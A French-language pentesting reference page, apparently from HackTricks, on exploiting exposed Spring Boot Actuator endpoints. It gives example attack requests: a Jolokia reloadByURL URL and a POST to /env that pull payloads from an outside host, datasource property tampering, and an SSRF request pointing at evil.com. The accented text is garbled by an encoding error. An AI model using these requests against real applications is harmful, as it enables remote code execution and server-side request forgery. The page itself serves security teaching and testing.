# Spring Actuators

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
{% endhint %}

## **Bypass d'authentification Spring**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**Provenant de** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploitation des Actuators Spring Boot

**Consultez le post original de** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Points Cl√©s :**

* Les Actuators Spring Boot enregistrent des points de terminaison tels que `/health`, `/trace`, `/beans`, `/env`, etc. Dans les versions 1 √† 1.4, ces points de terminaison sont accessibles sans authentification. √Ä partir de la version 1.5, seuls `/health` et `/info` sont non sensibles par d√©faut, mais les d√©veloppeurs d√©sactivent souvent cette s√©curit√©.
* Certains points de terminaison des Actuators peuvent exposer des donn√©es sensibles ou permettre des actions nuisibles :
* `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, et `/heapdump`.
* Dans Spring Boot 1.x, les actuators sont enregistr√©s sous l'URL racine, tandis que dans 2.x, ils sont sous le chemin de base `/actuator/`.

### **Techniques d'Exploitation :**

1. **Ex√©cution de Code √† Distance via '/jolokia'** :
* Le point de terminaison de l'actuator `/jolokia` expose la biblioth√®que Jolokia, qui permet l'acc√®s HTTP aux MBeans.
* L'action `reloadByURL` peut √™tre exploit√©e pour recharger les configurations de journalisation √† partir d'une URL externe, ce qui peut conduire √† un XXE aveugle ou √† une Ex√©cution de Code √† Distance via des configurations XML √©labor√©es.
* Exemple d'URL d'exploitation : `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **Modification de Configuration via '/env'** :
* Si les biblioth√®ques Spring Cloud sont pr√©sentes, le point de terminaison `/env` permet de modifier les propri√©t√©s environnementales.
* Les propri√©t√©s peuvent √™tre manipul√©es pour exploiter des vuln√©rabilit√©s, telles que la vuln√©rabilit√© de d√©s√©rialisation XStream dans le service Eureka serviceURL.
* Exemple de requ√™te POST d'exploitation :

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **Autres Param√®tres Utiles** :
* Des propri√©t√©s comme `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, et `spring.datasource.tomcat.max-active` peuvent √™tre manipul√©es pour diverses exploitations, telles que l'injection SQL ou la modification des cha√Ænes de connexion √† la base de donn√©es.

### **Informations Suppl√©mentaires :**

* Une liste compl√®te des actuators par d√©faut peut √™tre trouv√©e [ici](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt).
* Le point de terminaison `/env` dans Spring Boot 2.x utilise le format JSON pour la modification des propri√©t√©s, mais le concept g√©n√©ral reste le m√™me.

### **Sujets Connexes :**

1. **Env + H2 RCE** :
* Les d√©tails sur l'exploitation de la combinaison du point de terminaison `/env` et de la base de donn√©es H2 peuvent √™tre trouv√©s [ici](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database).
2. **SSRF sur Spring Boot par une Interpr√©tation Incorrecte des Noms de Chemin** :
* La gestion des param√®tres de matrice (`;`) par le framework Spring dans les noms de chemin HTTP peut √™tre exploit√©e pour une falsification de requ√™te c√¥t√© serveur (SSRF).
* Exemple de requ√™te d'exploitation :

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
</details>
{% endhint %}
